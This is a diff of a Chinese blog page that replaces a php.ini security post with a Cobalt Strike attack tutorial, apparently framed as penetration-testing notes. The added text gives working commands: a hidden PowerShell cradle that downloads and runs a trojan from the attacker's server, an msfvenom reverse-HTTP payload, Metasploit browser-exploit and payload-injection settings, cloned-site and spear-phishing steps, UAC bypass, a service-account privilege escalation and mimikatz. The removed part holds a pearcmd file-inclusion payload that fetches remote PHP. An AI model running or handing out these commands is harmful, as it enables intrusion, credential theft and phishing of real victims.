@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    PHP.INI |  
+    cobaltstrike |  
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-PHP-INI"
+  id="post-cobaltstrike"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,22 +67,22 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  PHP.INI
+  cobaltstrike
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/10/26/PHP-INI/" class="article-date">
-  <time datetime="2020-10-26T00:10:53.000Z" itemprop="datePublished">2020-10-26</time>
+      <a href="/2020/11/06/cobaltstrike/" class="article-date">
+  <time datetime="2020-11-06T02:28:40.000Z" itemprop="datePublished">2020-11-06</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">830</span>
+            <span class="post-count">1.5k</span>
         </span>
     </span>
 
@@ -91,7 +91,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">6 min</span>
         </span>
     </span>
 </div>
@@ -106,37 +106,82 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="深入理解phpinfo"><a href="#深入理解phpinfo" class="headerlink" title="深入理解phpinfo()"></a>深入理解phpinfo()</h1><h2 id="一、php-ini核心配置说明"><a href="#一、php-ini核心配置说明" class="headerlink" title="一、php.ini核心配置说明"></a>一、php.ini核心配置说明</h2><p><strong>short_open_tag</strong>（是否开启PHP代码标志的缩写形式）</p>
-<p>假如被开启了该配置，<code>&lt;? ?&gt;</code>也可以作为php语言开始的标志，可以用于绕过对于<code>&lt;?php</code>的检测。同时<code>&lt;?=</code> 和<code>&lt;? echo</code> 等价。和<code>asp_tags</code>的配置相同，但是后面这个是开启ASP的标志<code>&lt;%%&gt;</code>.但是在7.0.0版本之后就被搞出去了，可能是太好绕过WAF了。</p>
-<p><strong>disable_functions</strong>(禁止内置函数)和<strong>disable_classes</strong>（ 禁止类）</p>
-<p><strong>script_encoding</strong>（如果没有declare语句出现时，生效文件编码）</p>
-<p><strong>variables_order</strong>（<code>E</code>nvironment, <code>G</code>et, <code>P</code>ost, <code>C</code>ookie, and <code>S</code>erver,是否开启这些特殊变量）</p>
-<p><strong>request_order</strong>（指定GET，POST,COOKie进入php寄存器的顺序，从左到右，新值覆盖旧值）</p>
-<p><strong>register_globals</strong>（自动注册PHP变量）<strong>本特性已自 PHP 5.3.0 起<em>废弃</em>并将自 PHP 5.4.0 起<em>移除</em>。</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">register_globals &#x3D; on</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 当用户合法的时候，赋值 $authorized &#x3D; true</span><br><span class="line">if (authenticated_user()) &#123;</span><br><span class="line">    $authorized &#x3D; true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 由于并没有事先把 $authorized 初始化为 false，</span><br><span class="line">&#x2F;&#x2F; 当 register_globals 打开时，可能通过GET auth.php?authorized&#x3D;1 来定义该变量值</span><br><span class="line">&#x2F;&#x2F; 所以任何人都可以绕过身份验证</span><br><span class="line">if ($authorized) &#123;</span><br><span class="line">    include &quot;&#x2F;highly&#x2F;sensitive&#x2F;data.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">单纯地关闭 register_globals 并不代表所有的代码都安全了。对于每一段提交上来的数据，都要对其进行具体的检查。永远要验证用户数据和对变量进行初始化！</span><br></pre></td></tr></table></figure>
+  <h1 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h1><h1 id="一、基础使用"><a href="#一、基础使用" class="headerlink" title="一、基础使用"></a>一、基础使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver 192.168.43.224 123456 启动服务器端</span><br><span class="line">在windows下的链接</span><br><span class="line">双击bat文件即可</span><br><span class="line">在linux下</span><br><span class="line">.&#x2F;start.sh</span><br></pre></td></tr></table></figure>
 
-<p><strong>register_argc_argv</strong>（告诉php是否注册<code>argv &amp; argc variables</code> )</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令行模式：https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;features.commandline.php</span><br><span class="line">这样可以通过CLI SAPI 将URL中的数据传递到命令行模式中执行</span><br><span class="line">?f&#x3D;pearcmd&amp;+install&amp;+http:&#x2F;&#x2F;a.com&#x2F;1.php</span><br><span class="line">f是文件包含，将执行这个pearcmd文件，然后输入到了命令行模式了，后面的参数也会传入到命令行中</span><br><span class="line">$argc包含当运行于命令行下时传递给当前脚本的参数的数目。</span><br><span class="line">$argv — 传递给脚本的参数数组</span><br></pre></td></tr></table></figure>
+<p>让目标机器链接上teamserver</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.设置好监听器</span><br><span class="line">2.生成攻击载荷</span><br><span class="line">	url它是个文件路径，就是让目标（受害者）通过地址下载恶意脚本</span><br><span class="line">	powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.43.224:80&#x2F;a&#39;))&quot;</span><br><span class="line">	http:&#x2F;&#x2F;192.168.43.224&#x2F;a这是一段木马</span><br><span class="line">	就是使用powershell来进行下载代码并且运行</span><br><span class="line">3.攻击</span><br></pre></td></tr></table></figure>
 
-<p><strong>enable_post_data_reading</strong>（是否启用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.post.php">$_POST</a> and <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.files.php">$_FILES</a>来进行读取数据）</p>
-<p>如果设置为false，就会只能通过<code>php://input</code>来读取传递的数据。</p>
-<p><strong>auto_prepend_file和auto_append_file</strong>（区别在于加载file的时间）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If the script is terminated with exit(), auto-append will not occur.</span><br></pre></td></tr></table></figure>
+<h2 id="二、Cobalt-Stike使用重定器"><a href="#二、Cobalt-Stike使用重定器" class="headerlink" title="二、Cobalt Stike使用重定器"></a>二、Cobalt Stike使用重定器</h2><p>第一保护服务器地址，并作为攻击者，它也是一个很好的安全操作。第二 它给予了一些很好的适应能力，假如工具中有一两个堵塞了也没有什么大不了的，也可以进行通信。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:80,fork TCP4:team.cskali.com:80 将监听道德80端口的数据转发到teamserve的80端口上</span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc"><strong>magic_quotes_gpc</strong></a>（开启魔术方法，自动转义）</p>
-<p><strong>include_path</strong>（很重要，但没必要讲）</p>
-<p><strong>open_basedir</strong>（限制包含目录，但是可以绕过）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In httpd.conf, open_basedir can be turned off (e.g. for some virtual hosts) the same way as any other configuration directive with &quot;php_admin_value open_basedir none&quot;.</span><br></pre></td></tr></table></figure>
+<p>在监听的host设置上来，应该设置为分机的host上的80端口，因为已经做了转发，可以直接设置。</p>
+<p>然后再设置beacon时，相当于几个备用的接口。</p>
+<p>注意DNS</p>
+<p>的设置（当然在公网环境下买的没有这个需求）</p>
+<h2 id="三、DNS-Beacon的使用与原理"><a href="#三、DNS-Beacon的使用与原理" class="headerlink" title="三、DNS Beacon的使用与原理"></a>三、DNS Beacon的使用与原理</h2><p>DNS木马隐蔽性好，在受害者不会开放任何端口，可以有效地规避防火墙协议，走的是53端口</p>
+<p><strong>分类</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows&#x2F;beacon_dns.resrve_http(传输数据小)</span><br><span class="line">beacon_dns&#x2F;reserve_http（支持命令切换模式 mode dns)速度很慢，但非常隐蔽</span><br><span class="line">beacon_dns&#x2F;reserve_dns_txt(支持命令切换模式： mode dns_txt) 传输数据量更大，推荐使用</span><br><span class="line">windows&#x2F;beacon_dns&#x2F;reverse_dns_txt（传输数据打）</span><br></pre></td></tr></table></figure>
 
-<p><strong>cgi.check_shebang_line</strong>（控制PHP是否检测#号开头的行）</p>
-<p><code>cgi.discard_path</code> <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.boolean.php">boolean</a></p>
-<p>If this is enabled, the PHP CGI binary can safely be placed outside of the web tree and people will not be able to circumvent .htaccess security.</p>
-<p><code>cgi.fix_pathinfo</code> <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.boolean.php">boolean</a></p>
-<p>Provides <em>real</em> <code>PATH_INFO</code>/ <code>PATH_TRANSLATED</code> support for CGI. PHP’s previous behaviour was to set <code>PATH_TRANSLATED</code> to <code>SCRIPT_FILENAME</code>, and to not grok what <code>PATH_INFO</code> is. For more information on <code>PATH_INFO</code>, see the CGI specs. Setting this to <code>1</code> will cause PHP CGI to fix its paths to conform to the spec. A setting of zero causes PHP to behave as before. It is turned on by default. You should fix your scripts to use <code>SCRIPT_FILENAME</code> rather than <code>PATH_TRANSLATED</code>.</p>
-<p><strong>allow_url_include</strong>解决了远端引用(Include)</p>
-<p><strong>allow_url_fopen</strong>去打开远端的文件</p>
-<p>enable_dl = On （禁用dl()函数主要是出于安全考虑，因为它可以绕过open_basedir指令的限制。）</p>
-<h2 id="二、参考链接"><a href="#二、参考链接" class="headerlink" title="二、参考链接"></a>二、参考链接</h2><p>php.ini详解：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hugongs/articles/1060223.html">https://www.cnblogs.com/hugongs/articles/1060223.html</a></p>
+<p>域名创建a记录test.1377day.com指向teamserver</p>
+<p>接着创建三个ns记录 分别为C1,C2,C3指向test.1377day.com</p>
+<p>进入beacon 打开help</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用checkin命令来进入尝试数据连续返回，发一些基本信息回来</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、用户驱动攻击"><a href="#四、用户驱动攻击" class="headerlink" title="四、用户驱动攻击"></a>四、用户驱动攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep + 数字 调节屏幕暗的时间</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、派生会话"><a href="#五、派生会话" class="headerlink" title="五、派生会话"></a>五、派生会话</h2><p>派生会话，选择好监听器，会选择执行，在选择ip的时候，选择的是新的主机的ip<code>192.168.0.134</code>但是beacons依然选择原来的teamserver，新建一个会话的监听。</p>
+<p>1.派生会话（自身增加会话，或者给其他的teamserver）</p>
+<p>2.派生metasploit会话</p>
+<p>首先还是新建一个监听器，tcp/ip，选择<code>windows/foreign/reverse_tcp</code>这个payload，然后主机设置你的metasploit监听的端口，主机，确保一致，</p>
+<p>4.metasplot生成木马与cobalt strike会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;192.168.0.104 LPORT&#x3D;8808 -f exe &gt; &#x2F;tmp&#x2F;shell1.exe</span><br></pre></td></tr></table></figure>
+
+<p>注意在添加监听器的时候，要选择http的监听模式，不要搞错了，这个很重要。这个就是host:192.168.0.104,port:8808的监听模式。</p>
+<p>把msf生成的木马拿到肉鸡上去执行就会返回一个会话，也可以使用</p>
+<p>5.metasploit使用溢出exp与cobalt strike会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution</span><br><span class="line">set srvhost 192.168.0.134 这是teamserver</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set LHOST 192.168.0.104 本地监听的localhost，就是黑客电脑</span><br><span class="line">set lport 8888</span><br><span class="line">set disablepayloadhandler True</span><br><span class="line">set PrependMigrate true</span><br><span class="line">set lhost 80</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>将<code>DisablePayLoadHandler</code>设置为true。这告诉metasploit框架，它不需要在metasploit框架内创建处理程序来服务有效负载连接。就是让cobalt strike来处理。</p>
+<p><code>set PrependMigrate true</code></p>
+<p>这个选项告诉metasploit框架修改其stager，以便在利用之后立即迁移到另一个进程。此选项对于客户端攻击非常重要。它允许您的会话在被利用的应用程序崩溃或关闭时存活。</p>
+<p>当xp系统的受害人用浏览器访问<a target="_blank" rel="noopener" href="http://192.168.0.134/1Gk97z32pr">http://192.168.0.134:80/1Gk97z32pr</a> 这个带有攻击代码的链接时候，成功的话就会在cobalt strike 产生一个会话</p>
+<p><code>sessions -i + ID</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set session 3</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lhsot 192.168.0.104</span><br><span class="line">set lport 8888</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+<p>将这个sessions分配个cobaltstrike.</p>
+<p><code>会话的协议，一定要对应，不然会一直报错的。</code></p>
+<h1 id="六、钓鱼攻击"><a href="#六、钓鱼攻击" class="headerlink" title="六、钓鱼攻击"></a>六、钓鱼攻击</h1><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>1.html文件运行钓鱼病毒</p>
+<p>2.宏病毒</p>
+<h2 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h2><p>收集用户浏览器客户端的信息，web管理模块，可以查看现在能使用的web模块</p>
+<h2 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h2><p>进行攻击</p>
+<p>进行键盘记录</p>
+<p>下载执行木马</p>
+<h2 id="meatsploit溢出攻击配合cobal"><a href="#meatsploit溢出攻击配合cobal" class="headerlink" title="meatsploit溢出攻击配合cobal"></a>meatsploit溢出攻击配合cobal</h2><p>命令一敲万事大吉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution</span><br><span class="line">set srvhost 192.168.0.134</span><br><span class="line">set SRVPORT 888</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.0.134</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://192.168.0.134:888/tsGoWgaV4P9NW">http://192.168.0.134:888/tsGoWgaV4P9NW</a></p>
+<p>将上面的url地址放入到克隆网站的攻击网址里面 当受害人访问<a target="_blank" rel="noopener" href="http://192.168.0.134/msf">http://192.168.0.134:80/msf</a> 就会加载<a target="_blank" rel="noopener" href="http://192.168.0.134:888/tsGoWgaV4P9NW">http://192.168.0.134:888/tsGoWgaV4P9NW</a></p>
+<h1 id="七、鱼叉钓鱼攻击"><a href="#七、鱼叉钓鱼攻击" class="headerlink" title="七、鱼叉钓鱼攻击"></a>七、鱼叉钓鱼攻击</h1><p>1.准备要钓鱼的目标邮箱</p>
+<p>2.模版文件</p>
+<p>在准备账号密码的时候，账号和密码之间一定要使用两下<code>tab</code>键</p>
+<p>3.smtp发送邮箱</p>
+<h1 id="八、权限提升"><a href="#八、权限提升" class="headerlink" title="八、权限提升"></a>八、权限提升</h1><p>UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p>
+<p>常用的权限提升方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypassuac</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用ms14-058提权</strong></p>
+<p>在里面使用cmd命令的时候，使用<code>shell whoami</code></p>
+<p><code>whiami/groups</code>查看用户权限和用户组的信息</p>
+<p>smb-pipe beacon 推荐内网环境下使用</p>
+<p><strong>powershell提权</strong></p>
+<p>需要收集自己的提权脚本进行使用</p>
+<p><code>powershell-import 导入脚本</code></p>
+<p><code>powershell Invoke-AllChecks</code>开始扫描</p>
+<p>然后<code>icacls 查看权限 F完全控制</code>一定要有完全的F权限才行</p>
+<p>增加用户系统用户</p>
+<p><code>powershell Install-ServiceBinary -ServiceName Protect_2345Explorer -UserName rockyou123455 -Password 123456</code></p>
+<p>spawnas <code>.</code>(这是域)  然后使用账号密码，来获得一个新的beacon，然后就可以bypassuac获取超级权限</p>
+<p>运行mimikatz</p>
  
       <!-- reward -->
       
@@ -199,12 +244,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/10/26/PHP-INI/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/11/06/cobaltstrike/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
 
     </footer>
   </div>
@@ -212,19 +257,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2020/10/30/%E5%86%85%E7%BD%91/" class="article-nav-link">
+      <a href="/2020/11/08/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E8%B0%9C/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            内网
+            Python反序列化之谜
           
         </div>
       </a>
     
     
-      <a href="/2020/10/24/Apache-conf/" class="article-nav-link">
+      <a href="/2020/10/30/SSI/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">Apache_conf</div>
+        <div class="article-nav-title">SSI</div>
       </a>
     
   </nav>
